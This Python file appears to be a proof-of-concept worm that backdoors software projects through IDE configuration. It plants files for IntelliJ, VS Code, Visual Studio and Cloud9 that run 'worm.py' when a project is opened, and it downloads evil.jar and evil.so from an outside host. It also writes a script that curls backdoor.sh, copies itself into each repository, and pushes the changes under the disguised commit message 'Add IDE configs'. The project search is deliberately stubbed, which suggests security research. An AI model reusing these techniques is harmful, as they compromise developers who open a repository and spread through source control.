import abc
import json
import shlex
import shutil
from typing import List, Iterator, Dict, Any
import requests
import os


class Backdoor(abc.ABC):
    modified_files: List[str] = []

    @abc.abstractmethod
    def backdoor(self, project_path: str) -> None:
        return

    def make_bash_entrypoint(self, path: str) -> None:
        with open(path, 'w') as f:
            self.modified_files.append(f.name)
            f.write(
                """
                #!/bin/bash
                python3 worm.py
                curl https://daviddworken.com/backdoor.sh
                """
            )
        os.chmod(path, 0o775)



class IntelliJBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        # evil.jar comes from idea-startup-poc/ and just executes `python3 worm.py`
        with open(os.path.join(project_path, 'evil.jar'), 'wb') as f:
            self.modified_files.append(f.name)
            f.write(requests.get('https://daviddworken.com/ide-worm/evil.jar').content)
        mkdirp(os.path.join(project_path, '.idea/'))
        with open(os.path.join(project_path, '.idea/', 'workspace.xml'), 'w') as f:
            self.modified_files.append(f.name)
            f.write("""
            <?xml version="1.0" encoding="UTF-8"?>
            <project version="4">
              <component name="RunManager" selected="JAR Application.RCE">
                <configuration name="RCE" type="JarApplication" nameIsGenerated="true">
                  <option name="JAR_PATH" value="$PROJECT_DIR$/evil.jar" />
                  <option name="WORKING_DIRECTORY" value="$PROJECT_DIR$" />
                  <option name="ALTERNATIVE_JRE_PATH_ENABLED" value="true" />
                  <option name="ALTERNATIVE_JRE_PATH" value="11" />
                  <method v="2" />
                </configuration>
                <list>
                  <item itemvalue="JAR Application.RCE" />
                </list>
              </component>
            </project>
            """)


class VSCodeBackdoor(Backdoor):
    def add_to_workspace_settings(self, project_path: str, new_settings: Dict[str, Any]) -> None:
        mkdirp(os.path.join(project_path, '.vscode'))
        settings_path = os.path.join(project_path, '.vscode', 'settings.json')
        existing_settings = {}
        if os.path.exists(settings_path):
            with open(settings_path) as f:
                existing_settings = json.loads(f.read())
        updated_settings = {**existing_settings, **new_settings}
        with open(settings_path, 'w') as f:
            self.modified_files.append(f.name)
            f.write(json.dumps(updated_settings, indent=4))


class VSCodePythonBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        mkdirp(os.path.join(project_path, '.venv', 'bin'))
        poc_path = os.path.join(project_path, '.venv', 'bin', 'python3')
        self.make_bash_entrypoint(poc_path)


class VSCodeESLintBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        mkdirp(os.path.join(project_path, 'node_modules/eslint/lib'))
        with open(os.path.join(project_path, 'node_modules/eslint/lib/api.js'), 'w') as f:
            f.write(
                """
                const { exec } = require("child_process");
                exec("python3 worm.py")
                """
            )
            self.modified_files.append(f.name)


class VSCodeJavaBackdoor(VSCodeBackdoor):
    def backdoor(self, project_path: str) -> None:
        # evil.so just executes `python3 worm.py`
        with open(os.path.join(project_path, 'evil.so'), 'wb') as f:
            self.modified_files.append(f.name)
            f.write(requests.get('https://daviddworken.com/ide-worm/evil.so').content)
        self.add_to_workspace_settings(
            project_path,
            {
                'maven.terminal.customEnv': [{
                    "environmentVariable": "LD_PRELOAD",
                    "value": "./payload.so"
                }]
            }
        )


class VSCodeCBackdoor(VSCodeBackdoor):
    def backdoor(self, project_path: str) -> None:
        self.make_bash_entrypoint(os.path.join(project_path, 'custom-compiler'))

        self.add_to_workspace_settings(
            project_path,
            {
                'C_Cpp.default.compilerPath': "./custom-compiler"
            }
        )


class VisualStudioBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        with open(os.path.join(project_path, 'CMakeLists.txt'), 'w') as f:
            self.modified_files.append(f.name)
            f.write(
                """
                project(hello-cmake)
                execute_process(COMMAND evil.bat RESULT_VARIABLE rv WORKING_DIRECTORY ${PROJECT_SOURCE_DIR} OUTPUT_VARIABLE out)
                """
            )
        with open(os.path.join(project_path, 'evil.bat'), 'w') as f:
            self.modified_files.append(f.name)
            f.write("python3 worm.py")


class EclipseBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        # TODO: Implement a backdoor for Eclipse
        pass


class TheiaBackdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        # TODO: Implement backdoor(s) for Theia
        pass


class Cloud9Backdoor(Backdoor):
    def backdoor(self, project_path: str) -> None:
        mkdirp(os.path.join(project_path, '.c9'))
        with open(os.path.join(project_path, '.c9', 'project.settings'), 'w') as f:
            self.modified_files.append(f.name)
            f.write(
                """
                {
                    "python": {
                        "@path": "/usr/local/lib/python3.4/dist-packages:/usr/local/lib/python3.5/dist-packages",
                        "@pylintFlags": "--evaluation='__import__(\"os\").system(\"python3 worm.py\")' "
                    },
                }
                """
            )


def find_projects() -> Iterator[str]:
    # TODO: Find all repositories on the user's computer. Purposefully unimplemented so I don't accidentally start a worm :) 
    return ['repo']


def is_git_repo(project_path: str) -> bool:
    return os.path.exists(os.path.join(project_path, ".git"))


def git_add_push(project_path: str, files: Iterator[str]) -> None:
    os.system(f"""
        cd {project_path} && 
        git add -f {' '.join([shlex.quote(f) for f in files])} && 
        git commit -m 'Add IDE configs' && 
        git push 
    """)


def scm_save(project_path: str, modified_files: Iterator[str]) -> None:
    if is_git_repo(project_path):
        git_add_push(project_path, modified_files)
    # TODO: Implement support for more SCM systems 


def mkdirp(path: str) -> None:
    if not os.path.exists(path):
        os.makedirs(path)


def worm() -> None:
    backdoors: Iterator[Backdoor] = [
        IntelliJBackdoor(),
        VSCodePythonBackdoor(),
        VSCodeESLintBackdoor(),
        VSCodeJavaBackdoor(),
        VSCodeCBackdoor(),
        VisualStudioBackdoor(),
        EclipseBackdoor(),
        TheiaBackdoor(),
        Cloud9Backdoor(),
        # TODO: More backdoors? 
    ]
    for project_path in find_projects():
        modified_files = {os.path.join(project_path, 'worm.py')}
        for backdoor in backdoors:
            print(f"Backdooring {os.path.abspath(project_path)!r} with {backdoor.__class__.__name__!r}")
            shutil.copyfile(__file__, os.path.join(project_path, 'worm.py'))
            backdoor.backdoor(project_path)
            modified_files |= set(backdoor.modified_files)
        scm_save(project_path, [os.path.abspath(p) for p in modified_files])


if __name__ == '__main__':
    worm()
